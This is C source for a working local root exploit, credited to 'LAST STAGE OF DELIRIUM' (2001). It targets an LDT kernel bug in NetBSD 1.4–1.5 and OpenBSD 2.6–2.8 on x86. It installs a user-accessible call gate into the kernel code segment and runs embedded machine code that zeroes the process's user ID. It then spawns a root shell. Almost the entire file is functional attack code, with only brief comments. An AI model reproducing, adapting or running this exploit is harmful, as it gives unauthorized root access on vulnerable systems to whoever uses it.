/*## copyright LAST STAGE OF DELIRIUM apr 2001 poland        *://lsd-pl.net/ #*/
/*## ldt kernel bug                                                          #*/

/*   the code installs trap call gate descriptor with DPL=3 targeting kernel  */
/*   code segment selector KCSSEL (DPL=0) in task local descriptor table LDT  */
/*   through sysarch(I386_SET_LDT,struct i386_set_ldt_args*) system call.     */

/*   as a result command shell is spawned with effective root user privilege. */
/*   NOTE: possible direct jump to user space adr=(unsigned int)&asmcode[24]; */

#include <sys/types.h>
#include <i386/sysarch.h>
#include <i386/segments.h>
#include <sys/param.h>
#include <sys/sysctl.h>

#define kds()    GSEL(GDATA_SEL,SEL_KPL)
#define uds()    LSEL(LUDATA_SEL,SEL_UPL)
#define ofs(s,m) (unsigned int)(&(((s*)0)->m))
#define ofscr()  (ofs(struct proc,p_cred))
#define ofsid()  (ofs(struct pcred,p_ruid))

char asmcode[]={
    0x55,                      /* pushl   %ebp                   */
    0x89,0xe5,                 /* movl    %esp,%ebp              */
    0xe8,0,0,0,0,              /* call    <asmcode+8>            */ 
    0x5c,                      /* popl    %esp                   */
    0x83,0xc4,0x10,            /* addl    $0x10,%esp             */
    0x9a,0,0,0,0,0x06,0,       /* lcall   $0x06,$0x00000000      */
    0x6a,uds(),                /* pushl   $0x??                  */
    0x1f,                      /* popl    %ds                    */
    0xc9,                      /* leave                          */
    0xc3,                      /* ret                            */

    0x6a,kds(),                /* pushl   $0x??                  */
    0x1f,                      /* popl    %ds                    */
    0x8b,0x54,0x24,0x1e,       /* movl    0x1e(%esp),%edx        */
    0x8b,0x4a,ofscr(),         /* movl    0x??(%edx),%ecx        */
    0x31,0xc0,                 /* xorl    %eax,%eax              */
    0x89,0x41,ofsid(),         /* movl    %eax,0x??(%ecx)        */
    0xca,0x1c,0,               /* lret    $0x1c                  */
    0,0,0,0
};

main(int argc,char **argv){
    unsigned int mib[2],len,adr;
    union descriptor desc;struct i386_set_ldt_args p;
    struct kinfo_proc k;

    printf("copyright LAST STAGE OF DELIRIUM apr 2001 poland  //lsd-pl.net/\n");
    printf("ldt kernel bug for netbsd 1.4 1.4.x 1.5, openbsd 2.6-2.8 x86\n\n");

    mib[0]=CTL_KERN;
    mib[1]=KERN_PROC;
    mib[2]=KERN_PROC_PID;
    mib[3]=getpid();
    len=sizeof(struct kinfo_proc);
    sysctl(mib,4,&k,&len,NULL,0);

    adr=(unsigned int)k.kp_proc.p_addr+USPACE-0x20+4+4-(7<<2);

    printf("u-area=0x%08x proc=0x%08x ",k.kp_proc.p_addr,k.kp_eproc.e_paddr);
    printf("adr=0x%08x\n",adr);

    *((unsigned int*)&asmcode[46])=(unsigned int)k.kp_eproc.e_paddr;

    desc.gd.gd_hioffset=(adr>>16)&0xffff;
    desc.gd.gd_looffset=adr&0xffff;

    desc.gd.gd_type=SDT_SYS386CGT;
    desc.gd.gd_selector=GSEL(GCODE_SEL,SEL_KPL);
    desc.gd.gd_stkcpy=7;
    desc.gd.gd_p=1;
    desc.gd.gd_dpl=SEL_UPL;

    p.start=0;
    p.desc=&desc;
    p.num=1;

    sysarch(I386_SET_LDT,(void*)&p);
    (((void(*)())asmcode))();
    seteuid(0);

    execl("/bin/sh","lsd",0);
}

